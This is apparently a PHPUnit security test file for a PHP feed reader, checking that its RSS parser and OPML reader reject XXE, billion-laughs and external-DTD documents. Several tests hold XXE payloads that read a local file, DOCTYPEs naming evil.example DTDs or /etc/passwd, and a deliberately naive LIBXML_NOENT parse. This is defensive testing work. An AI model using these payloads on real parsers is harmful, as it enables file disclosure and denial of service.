<?php

declare(strict_types=1);

namespace Zfeeder\Tests\Security;

use Symfony\Component\HttpClient\MockHttpClient;
use Symfony\Component\HttpClient\Response\MockResponse;
use Zfeeder\Exception\ParseException;
use Zfeeder\Exception\StorageException;
use Zfeeder\Parse\FeedParser;
use Zfeeder\Subscription\Opml\Reader;

/**
 * S9 — external entities are off, document type declarations carrying or naming
 * anything external are refused before a parser sees the bytes, and both the
 * feed parser and the OPML reader cap the document size.
 *
 * Closes 1.6 defect L13: `newsfeeds/includes/zfuncs.php:45` and `:137` opened
 * the file and fed it straight to expat with no limits of any kind, for feeds
 * and subscription lists alike.
 *
 * The control lives in `src/Parse/FeedParser::assertSafeXml()` (the internal
 * subset is rejected as text, so the entity declarations never exist) and
 * `src/Subscription/Opml/Reader::parse()` (`MAX_BYTES`, a literal `<!DOCTYPE`
 * check, `LIBXML_NONET`, no `LIBXML_NOENT`, and an external entity loader that
 * returns null).
 *
 * Each refusal is paired with the same payload parsed the naive way, so the
 * tests prove the attacks are real and not merely absent.
 */
final class S09XmlTest extends SecurityTestCase
{
    private const string SECRET = 'ZFEEDER-XXE-CANARY-9f2c';

    private function secretFile(): string
    {
        $path = $this->tempPath('canary.txt');
        file_put_contents($path, self::SECRET);

        return $path;
    }

    private function xxePayload(string $rootElement = 'rss'): string
    {
        return '<?xml version="1.0"?>'
            . '<!DOCTYPE ' . $rootElement . ' [<!ENTITY xxe SYSTEM "file://' . $this->secretFile() . '">]>'
            . '<' . $rootElement . ' version="2.0"><channel><title>&xxe;</title><link>http://x.example/</link>'
            . '<description>&xxe;</description></channel></' . $rootElement . '>';
    }

    public function testTheNaiveParserReallyDoesLeakALocalFile(): void
    {
        // The weakened build: this is what "parse the XML" means without the
        // guard. If this ever stops leaking, the assertions below stop meaning
        // anything and this test says so.
        libxml_use_internal_errors(true);
        $document = new \DOMDocument();
        $loaded = $document->loadXML($this->xxePayload(), LIBXML_NOENT | LIBXML_DTDLOAD);
        libxml_clear_errors();

        self::assertTrue($loaded);
        self::assertNotNull($document->documentElement);
        self::assertStringContainsString(self::SECRET, $document->documentElement->textContent);
    }

    public function testTheFeedParserRefusesTheXxePayloadAndReadsNoLocalFile(): void
    {
        $parser = new FeedParser();

        try {
            $channel = $parser->parse($this->xxePayload());
            self::fail('the XXE payload was parsed: ' . json_encode($channel, JSON_PARTIAL_OUTPUT_ON_ERROR));
        } catch (ParseException $e) {
            self::assertStringContainsString('internal subset', $e->getMessage());
            self::assertStringNotContainsString(self::SECRET, $e->getMessage());
        }
    }

    public function testTheRecordedXxeFixtureIsRefusedAndEtcPasswdNeverAppears(): void
    {
        $payload = zf_fixture_contents('payloads/xxe.xml');

        try {
            $channel = (new FeedParser())->parse($payload);
            self::fail('the recorded XXE fixture was parsed: ' . json_encode($channel, JSON_PARTIAL_OUTPUT_ON_ERROR));
        } catch (ParseException $e) {
            self::assertStringNotContainsString('root:', $e->getMessage());
            self::assertStringNotContainsString('/bin/', $e->getMessage());
        }
    }

    public function testTheNaiveParserReallyDoesExpandTheBillionLaughsPayload(): void
    {
        libxml_use_internal_errors(true);
        $document = new \DOMDocument();
        $loaded = $document->loadXML(zf_fixture_contents('payloads/billion-laughs.xml'), LIBXML_NOENT);
        libxml_clear_errors();

        self::assertTrue($loaded);
        self::assertNotNull($document->documentElement);
        self::assertGreaterThan(10_000, strlen($document->documentElement->textContent));
    }

    public function testBillionLaughsIsRefusedWithoutExpandingAnything(): void
    {
        $payload = zf_fixture_contents('payloads/billion-laughs.xml');

        $memoryBefore = memory_get_usage(true);
        $started = microtime(true);

        try {
            (new FeedParser())->parse($payload);
            self::fail('the billion laughs payload was parsed');
        } catch (ParseException $e) {
            self::assertStringContainsString('internal subset', $e->getMessage());
        }

        $elapsed = microtime(true) - $started;
        $growth = memory_get_usage(true) - $memoryBefore;

        // Refusing a 500-byte document should cost nothing at all. These bounds
        // are three orders of magnitude above what it takes and would still
        // catch an expansion.
        self::assertLessThan(1.0, $elapsed, sprintf('refusing the payload took %.3f seconds', $elapsed));
        self::assertLessThan(4_194_304, $growth, sprintf('refusing the payload cost %d bytes', $growth));
    }

    public function testEveryDoctypeThatCarriesOrNamesAnExternalResourceIsRefused(): void
    {
        $parser = new FeedParser();

        $payloads = [
            'internal subset' => '<!DOCTYPE rss [<!ENTITY a "b">]>',
            'system identifier' => '<!DOCTYPE rss SYSTEM "http://evil.example/evil.dtd">',
            'public identifier' => '<!DOCTYPE rss PUBLIC "-//EVIL//DTD//EN" "http://evil.example/evil.dtd">',
            'local system identifier' => '<!DOCTYPE rss SYSTEM "/etc/passwd">',
            'parameter entity' => '<!DOCTYPE rss [<!ENTITY % p SYSTEM "http://evil.example/p.dtd"> %p;]>',
        ];

        foreach ($payloads as $name => $doctype) {
            $document = '<?xml version="1.0"?>' . $doctype
                . '<rss version="2.0"><channel><title>t</title><link>http://x.example/</link>'
                . '<description>d</description></channel></rss>';

            try {
                $parser->parse($document);
                self::fail($name . ' was accepted');
            } catch (ParseException) {
                $this->addToAssertionCount(1);
            }
        }
    }

    public function testAFeedWithNoDoctypeAtAllIsStillParsed(): void
    {
        // The counterweight: the refusals above are the DOCTYPE rule, not a
        // parser that refuses everything.
        $channel = (new FeedParser())->parse(
            '<?xml version="1.0"?><rss version="2.0"><channel><title>Fine</title>'
            . '<link>http://x.example/</link><description>d</description>'
            . '<item><title>i</title><link>http://x.example/1</link></item></channel></rss>',
        );

        self::assertSame('Fine', $channel->title);
        self::assertCount(1, $channel->items);
    }

    public function testTheStrictParserRefusesEvenTheHistoricRss091Declaration(): void
    {
        $historic = '<?xml version="1.0"?>'
            . '<!DOCTYPE rss PUBLIC "-//Netscape Communications//DTD RSS 0.91//EN" '
            . '"http://my.netscape.com/publish/formats/rss-0.91.dtd">'
            . '<rss version="0.91"><channel><title>Old</title><link>http://x.example/</link>'
            . '<description>d</description></channel></rss>';

        // Accepted by default, because half the 2004 corpus opens with it and
        // it carries no internal subset to expand.
        self::assertSame('Old', (new FeedParser())->parse($historic)->title);

        // Refused when the stricter reading is asked for.
        $this->expectException(ParseException::class);
        (new FeedParser(allowHistoricDoctype: false))->parse($historic);
    }

    // ---- OPML --------------------------------------------------------------

    public function testAnOpmlDocumentWithAnInternalSubsetIsRefused(): void
    {
        $opml = '<?xml version="1.0"?>'
            . '<!DOCTYPE opml [<!ENTITY xxe SYSTEM "file://' . $this->secretFile() . '">]>'
            . '<opml version="1.0"><head><title>&xxe;</title></head><body>'
            . '<outline text="&xxe;" xmlUrl="https://x.example/f.xml" position="1"/></body></opml>';

        try {
            (new Reader())->readFeeds($opml);
            self::fail('an OPML document with a DTD was parsed');
        } catch (StorageException $e) {
            self::assertStringContainsString('DTD', $e->getMessage());
            self::assertStringNotContainsString(self::SECRET, $e->getMessage());
        }
    }

    public function testTheOpmlReaderRefusesEveryDoctypeIncludingAHarmlessOne(): void
    {
        // Feeds get one narrow exception for the 2004 RSS 0.91 declaration.
        // Subscription lists get none: no OPML file has ever needed a DTD.
        $opml = '<?xml version="1.0"?><!DOCTYPE opml><opml version="1.0"><head/><body/></opml>';

        $this->expectException(StorageException::class);
        (new Reader())->readFeeds($opml);
    }

    public function testTheOpmlReaderRefusesTheRecordedXxeAndBillionLaughsFixtures(): void
    {
        $reader = new Reader();

        foreach (['payloads/xxe.xml', 'payloads/billion-laughs.xml'] as $fixture) {
            try {
                $reader->readFeeds(zf_fixture_contents($fixture));
                self::fail($fixture . ' was parsed');
            } catch (StorageException $e) {
                self::assertStringContainsString('DTD', $e->getMessage(), $fixture);
                self::assertStringNotContainsString('root:', $e->getMessage());
            }
        }
    }

    public function testAnOversizedSubscriptionListIsRefusedBeforeParsing(): void
    {
        $padding = str_repeat(' ', Reader::MAX_BYTES + 1);
        $opml = '<?xml version="1.0"?><opml version="1.0"><head/>' . $padding . '<body/></opml>';

        try {
            (new Reader())->readFeeds($opml);
            self::fail('an oversized subscription list was parsed');
        } catch (StorageException $e) {
            self::assertStringContainsString('at most', $e->getMessage());
        }
    }

    // ---- the network --------------------------------------------------------

    public function testAnExternalDtdReferenceCausesNoNetworkRequest(): void
    {
        $http = new MockHttpClient([new MockResponse('<!ENTITY x "owned">')]);
        $this->kernel->withHttpClient($http);

        $document = '<?xml version="1.0"?><!DOCTYPE rss SYSTEM "http://evil.example/evil.dtd">'
            . '<rss version="2.0"><channel><title>t</title><link>http://x.example/</link>'
            . '<description>d</description></channel></rss>';

        try {
            $this->kernel->parser()->parse($document);
            self::fail('a document naming an external DTD was parsed');
        } catch (ParseException) {
            $this->addToAssertionCount(1);
        }

        try {
            (new Reader())->readFeeds(
                '<?xml version="1.0"?><!DOCTYPE opml SYSTEM "http://evil.example/evil.dtd">'
                . '<opml version="1.0"><head/><body/></opml>',
            );
            self::fail('an OPML document naming an external DTD was parsed');
        } catch (StorageException) {
            $this->addToAssertionCount(1);
        }

        self::assertSame(0, $http->getRequestsCount(), 'the parser fetched an external DTD');
    }

    public function testTheOpmlReaderLeavesNoExternalEntityLoaderBehind(): void
    {
        // The reader installs a deny-everything loader while it parses. If it
        // failed to restore the default, it would be changing global state for
        // every other libxml user in the process.
        $before = libxml_use_internal_errors(true);
        libxml_use_internal_errors($before);

        try {
            (new Reader())->readFeeds('<opml version="1.0"><head/><body/></opml>');
        } catch (StorageException) {
            // The shape of the document is not what this test is about.
        }

        $after = libxml_use_internal_errors(true);
        libxml_use_internal_errors($after);
        self::assertSame($before, $after, 'the reader changed libxml error handling for the whole process');

        // `libxml_get_external_entity_loader()` only exists from PHP 8.4; where
        // it does, assert the loader was put back rather than left installed.
        if (function_exists('libxml_get_external_entity_loader')) {
            self::assertNull(libxml_get_external_entity_loader(), 'the deny-everything entity loader was left installed');
        } else {
            self::assertStringContainsString(
                'libxml_set_external_entity_loader(null)',
                self::readFile(self::projectRoot() . '/src/Subscription/Opml/Reader.php'),
                'the reader does not restore the entity loader',
            );
        }
    }
}
